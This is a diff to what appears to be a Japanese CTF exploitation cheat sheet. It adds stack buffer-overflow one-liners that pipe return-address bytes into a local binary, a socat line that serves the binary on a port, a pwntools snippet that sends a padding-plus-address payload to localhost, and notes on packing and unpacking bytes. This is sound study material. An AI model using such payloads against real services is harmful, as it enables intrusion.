@@ -96,7 +96,8 @@ if sm.found:
 ## exploit
 ### stack base BOF
 - `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
-
+- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
+- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   
 ## よく見るかたまり
 #### strcmp
 ```txt
@@ -139,15 +140,27 @@ gdb-peda$ x /gx $rbp-0x88
   - 0x7fff1234 -> b '\x34\x12\xff\x7f'   
   ```python
   #python3のみ
+  # 文字列と結合しようとすると、
+  # TypeError: must be str, not bytes
   val.to_bytes(int(byte),'little')
   ```   
   ```python
   # python2 のみ
   from pwn import *
-  p32(0x7fff1234)
+  r = remote("localhost", 4444)
+  p32(0x7fff1234) # '4\x12\xff\x7f'
+  p64(0x7fff1234) # '4\x12\xff\x7f\x00\x00\x00\x00'
+  payload  = "A" * 0x28 + p64(0x7fff1234)
+  r.send(payload)
   ```
   - \x34\x12\xff\x7f -> 0x7fff1234   
   ```python
+  # python2 のみ
+  from pwn import *
+  hex(unpack('\xef\xbe\xad\xde')) # 0xdeadbeef
+  hex(u32('\xef\xbe\xad\xde'))  # 0xdeadbeef
+  hex(u64('\xef\xbe\xad\xde\x41\x42\x43\x45'))  # 0x45434241deadbeef
+  
   # python2,3 両方
   import struct
   print(hex(struct.unpack('<I',b'\x34\x12\xff\x7f')[0]))
